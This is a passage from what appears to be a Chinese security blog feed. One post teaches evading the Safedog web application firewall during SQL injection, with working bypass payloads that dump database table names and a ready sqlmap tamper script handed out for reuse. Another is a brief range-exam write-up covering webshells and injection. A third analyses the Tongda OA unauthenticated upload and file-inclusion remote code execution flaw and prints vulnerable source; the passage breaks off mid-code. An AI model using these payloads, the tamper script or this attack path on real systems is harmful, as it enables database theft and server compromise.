&#x2F;*!44466SELECT*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;CURRENT_USER()&#39;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><p>最终绕过安全狗成功跑出数据</p><p><img src="https://img-blog.csdnimg.cn/20200421092204127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的从绕狗到编写tamper</title>
      <link href="/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/"/>
      <url>/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><ul><li>安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的</li><li>但是实际情况是需要权衡可用性和安全性</li><li>当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截</li><li>所以最终就是正则的绕过</li><li>注意：</li><li>版本不同，他的正则规则也是不一样的</li><li>所以有的payload在新老版本是不能同吃。</li><li>但是没有关系，你学会这么绕，这都不是问题。</li></ul><h1 id="0x01-首先我们要判断哪个关键字被拦截了"><a href="#0x01-首先我们要判断哪个关键字被拦截了" class="headerlink" title="0x01 首先我们要判断哪个关键字被拦截了"></a>0x01 首先我们要判断哪个关键字被拦截了</h1><p>我们以 order by 3 这个简单的语句为例子</p><p>提供思路就是破坏单词去测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3  （拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 ordwer by 3 （破坏了order 没有拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order bay 3 （破坏了by 没有拦截）</span><br></pre></td></tr></table></figure><p>所以狗拦截的东西就是 order by 两个一起出现</p><p>所有后面的测试都是按照这个思路初步的判断。</p><h1 id="0x02-一些简单的知识点"><a href="#0x02-一些简单的知识点" class="headerlink" title="0x02 一些简单的知识点"></a>0x02 一些简单的知识点</h1><ul><li>绕过的一些基础</li><li>MySql注释内语句也可执行（/*! */）</li><li><code>/*! ....*/</code> 在其他很多地方都是注释。</li><li>但是在mysql中不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在<code>/*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!50001 select * from test *&#x2F;;</span><br></pre></td></tr></table></figure><p>这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被执行，基本上只做一个版本的判断。</p><ul><li>Mysql常用的符号</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">换行符号</span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">注释符合</span><br><span class="line">%23</span><br><span class="line"></span><br><span class="line">空白字符</span><br><span class="line">&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;</span><br><span class="line"></span><br><span class="line">不同的数据库不太一样，可以自己查一下</span><br></pre></td></tr></table></figure><p>还有一些bypass的常用注释符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h1 id="0x03-总结安全狗拦截的点"><a href="#0x03-总结安全狗拦截的点" class="headerlink" title="0x03 总结安全狗拦截的点"></a>0x03 总结安全狗拦截的点</h1><ul><li>and 1</li><li>只要and后面接数字，安全狗就会拦截</li><li>order by</li><li>order 后面接by，安全狗就会拦截</li><li>union select</li><li>只要union select 结合就被拦截,实测发现还是对select这个词的更加严格，主要饶select</li><li>database()</li><li>database后面接括号，安全狗就会拦截</li></ul><p>下面是测试成功的例子</p><p>order by 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试 order aby不拦截 ，我们让 by前面的注释掉就可以绕过</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order %23a%0aby 3</span><br></pre></td></tr></table></figure><p>union select绕过 同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure><p>database()绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,%23a%0adatabase&#x2F;*!*&#x2F;(),3</span><br></pre></td></tr></table></figure><p>一个完整的union查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,group_concat(table_name),3 %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure><p>还有一种注释版本号的 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*!44466select*&#x2F; 1,database&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure><h1 id="0x04-Sqlmap-tamper的编写"><a href="#0x04-Sqlmap-tamper的编写" class="headerlink" title="0x04 Sqlmap tamper的编写"></a>0x04 Sqlmap tamper的编写</h1><p>tamper是sqlmap对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。</p><p>为了好理解直接典例深刨析：</p><p>我们理解一下一个常用的tamper ：space2comment.py </p><p>这个脚本的功能就是：用“/**/”替换空格符</p><p>下面是完整的代码</p><pre><code>#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file &apos;LICENSE&apos; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    &quot;&quot;&quot;    Replaces space character (&apos; &apos;) with comments &apos;/**/&apos;    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    &gt;&gt;&gt; tamper(&apos;SELECT id FROM users&apos;)    &apos;SELECT/**/id/**/FROM/**/users&apos;    &quot;&quot;&quot;    retVal = payload    if payload:        retVal = &quot;&quot;        quote, doublequote, firstspace = False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace = True                    retVal += &quot;/**/&quot;                    continue            elif payload[i] == &apos;\&apos;&apos;:                quote = not quote            elif payload[i] == &apos;&quot;&apos;:                doublequote = not doublequote            elif payload[i] == &quot; &quot; and not doublequote and not quote:                retVal += &quot;/**/&quot;                continue            retVal += payload[i]    return retVal</code></pre><p>​    </p><h1 id="0x05-tamper主要的三个部分"><a href="#0x05-tamper主要的三个部分" class="headerlink" title="0x05 tamper主要的三个部分"></a>0x05 tamper主要的三个部分</h1><ul><li>第一部分priority</li><li>定义脚本的优先级，用于有多个tamper脚本的先后顺序</li><li>第二部分dependencies函数</li><li>该脚本适用/不适用的范围，也可以不写。</li><li>第三部分tamper函数</li><li>主要就是我们绕过的精华，要替换的内容。</li></ul><p>priority优先级</p><p>使用了多个tamper时，PRIORITY的参数等级较高的tamper先使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br></pre></td></tr></table></figure><p>有大概七个等级  LOWEST LOWER = LOW NORMAL HIGH HIGHER  HIGHEST</p><p>dependencies函数主要是提示用户适用范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上文中没写，就是没有提示，你要自己知道，其实不写也行就直接pass</span><br><span class="line">def dependencies():</span><br><span class="line">     singleTimeWarnMessage(&quot;这里输入想显示的内容“)</span><br></pre></td></tr></table></figure><p>tamper是重头戏</p><p>这是一个简单的双写绕过，tamper里面主要是一个替换的过程</p><p>payload就是那些关键词select union这下，经过替换只有return 回去，就是处理好的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&#39;union&#39;,&#39;uniounionn&#39;)</span><br></pre></td></tr></table></figure><p>所以中间具体怎么替换就是你的事情了。只有最后return回去就好了</p><h1 id="0x06-tamper编写测试方法"><a href="#0x06-tamper编写测试方法" class="headerlink" title="0x06 tamper编写测试方法"></a>0x06 tamper编写测试方法</h1><p>这里我说下几个坑点：</p><ul><li>手工过和写tamper不一样，sqlmap的语句和你用的并不一样</li><li>我有两个建议，一个是用slqmap 挂代理到burp去看到底可以不，我没用这个方法，点的有点累</li><li>我是打开 -v 参数，去看payload和提示，看哪里断开，复制payload去手工看看，绕过编写一下tamper</li><li>还有调试过程中 要打开–flush 参数刷新缓存</li><li>还有一个就是你的python代码能力了，如果你只是用简单的replace(）函数，就要注意替换的顺序，</li></ul><ul><li>例如会用到的相似的函数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SESSION_USER()  CURRENT_USER()  USER() </span><br><span class="line">这几个都有 user（） 如果你在最前面 替换了user（） </span><br><span class="line">那么后面就会出现CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;() 我这种绕过就不兼容了</span><br><span class="line">得在后面再自己调整</span><br></pre></td></tr></table></figure><ul><li>下面是我的绕过参数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1&quot; --tamper dogz.py --random-agent --flush -v 3 --batch --dbms mysql --current-user –-tech&#x3D;U</span><br></pre></td></tr></table></figure><h1 id="0x07-结束"><a href="#0x07-结束" class="headerlink" title="0x07 结束"></a>0x07 结束</h1><p>绕狗脚本给大家，如果跑的时候失效了可以按照上面的方法修改修改就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3.7</span><br><span class="line"># Author:Zeo</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    singleTimeWarnMessage(&quot;Zeo_bypass_safedog4.0&quot;)</span><br><span class="line">    </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload&#x3D;payload.replace(&#39;AND&#39;,&#39;&#x2F;*!44466AND*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;ORDER&#39;,&#39;&#x2F;*!44466order*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;BY&#39;,&#39;%23a%0aby&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;USER()&#39;,&#39;%23a%0aUSER&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;DATABASE()&#39;,&#39;%23a%0aDATABASE&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;SESSION_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;%23a%0aSESSION_USER()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;UNION ALL SELECT&#39;,&#39;UNION ALL &#x2F;*!44466SELECT*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;CURRENT_USER()&#39;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><p>最终绕过安全狗成功跑出数据</p><p><img src="https://img-blog.csdnimg.cn/20200421092204127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次360众测仿真实战靶场考核WP</title>
      <link href="/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/"/>
      <url>/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-考核主要分为两部分"><a href="#0x00-考核主要分为两部分" class="headerlink" title="0x00 考核主要分为两部分"></a>0x00 考核主要分为两部分</h1><ul><li><p>第一部分为客观题：分为单选题，多选题，和判断题。</p><p>我记录了一道有趣的题，也是不清楚正确答案的群</p></li><li><p>第二部分为操作题：</p></li></ul><h1 id="0x01客观题"><a href="#0x01客观题" class="headerlink" title="0x01客观题"></a>0x01客观题</h1><p>我记录了一道有趣的题，也是不清楚正确答案，有大佬知道吗</p><p><img src="https://img-blog.csdnimg.cn/2020040611053972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x02-操作题"><a href="#0x02-操作题" class="headerlink" title="0x02:操作题"></a>0x02:操作题</h1><ul><li>源码分析题，给你源码提及一个数据</li></ul><p><img src="https://img-blog.csdnimg.cn/20200406110455129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>PHP == 弱语言绕过 ，因为没弄过CTF也是印象比较深刻</p><ul><li>网站被黑，可以下载整站，找后门</li></ul><p>下载源码，找见后门webshell，看一眼，变形的一句话，连上</p><ul><li>一个加密的一句话木马</li></ul><p>就普通一句话各种decode</p><ul><li>IP伪造登陆 X-FORWORD</li></ul><p>只能客户端登陆</p><ul><li>一个弹幕网站</li></ul><p>进去发现是Struts2的，有工具一把梭</p><ul><li>xxx系统的数据库系统。postgresql</li></ul><p>识别出来是postgresql，但是连上了啥也没找到，没做出来。。。</p><ul><li>一个登录框</li></ul><p>点点发现有注入，sqlmap直接跑了</p><ul><li>wireshark分析数据包的</li></ul><p>有人改了数据库密码 找到修改的 数据库密码</p><ul><li>wireshark分析数据包的</li></ul><p>删除数据库记录的ip</p><ul><li>wireshark分析数据包的</li></ul><p>找上传者的ip</p><p>0x03 总结：</p><p>1、感觉是给我分的题不是很难，所以还行感觉</p><p>2、wireshark稍微看一下，其实有技巧，搜索关键字就行</p><p>3、主要是题型的分辩，知道考啥就好说，常见的CVE多复现，多练练就好了</p><p><img src="https://img-blog.csdnimg.cn/20200406110415461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意文件上传/文件包含RCE漏洞分析</title>
      <link href="/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="通达OA任意文件上传-文件包含RCE漏洞分析"><a href="#通达OA任意文件上传-文件包含RCE漏洞分析" class="headerlink" title="通达OA任意文件上传/文件包含RCE漏洞分析"></a>通达OA任意文件上传/文件包含RCE漏洞分析</h3><ul><li><a href="#0x01__4">0x01 前提</a></li><li><a href="#0x01__19">0x01 漏洞介绍</a></li><li><a href="#0x02__40">0x02 漏洞分析</a></li><li><ul><li><a href="#_53">首先下载安装</a></li><li><a href="#_63">绕过身份验证文件上传部分</a></li><li><a href="#_356">变量传递问题</a></li><li><a href="#_484">文件包含部分</a></li></ul></li></ul><h1 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h1><p>关于这个漏洞的利用方式：</p><p>​</p><p>利用方式大致有两种：</p><ol><li>包含日志文件。</li><li>绕过身份验证文件上传然后在文件包含。</li></ol><p>下面主要分析第二种</p><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p>_通达OA_系统代表了协同OA的先进理念,16年研发铸就成熟OA产品,协同OA软件行业唯一央企团队研发,多次摘取国内OA软件金奖,拥有2万多家正式用户,8万多家免费版用户,超过…</p><p>主要危害：</p><p>攻击者可以在为登陆或者说，无任何条件触发漏洞，上传图片木马文件，请求进行文件包含最终可达成远程命令执行</p><p>影响版本：</p><ul><li>V11版</li><li>2017版</li><li>2016版</li><li>2015版</li><li>2013版</li><li>2013增强版</li></ul><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>我用的官网下载的V11.3</p><p>利用方式大致有两种：</p><ol><li>包含日志文件。</li><li>绕过身份验证文件上传然后在文件包含。</li></ol><p>下面我主要分析饶过权限上传，然后文件包含的方式：</p><h2 id="首先下载安装"><a href="#首先下载安装" class="headerlink" title="首先下载安装"></a>首先下载安装</h2><p>打开源码一看，都加密了，使用zend进行了加密。</p><p>所以先要进行解密，百度即可。</p><p><img src="https://img-blog.csdnimg.cn/20200330094732543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="绕过身份验证文件上传部分"><a href="#绕过身份验证文件上传部分" class="headerlink" title="绕过身份验证文件上传部分"></a>绕过身份验证文件上传部分</h2><p>存在漏洞的上传功能文件为 webroot\ispirit\im\upload.php</p><p>解密后的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_file.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_msg.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'mobile/inc/funcs.php'</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">'ATTACHMENT'</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">'ID'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">'NAME'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">'mobile'</span>) 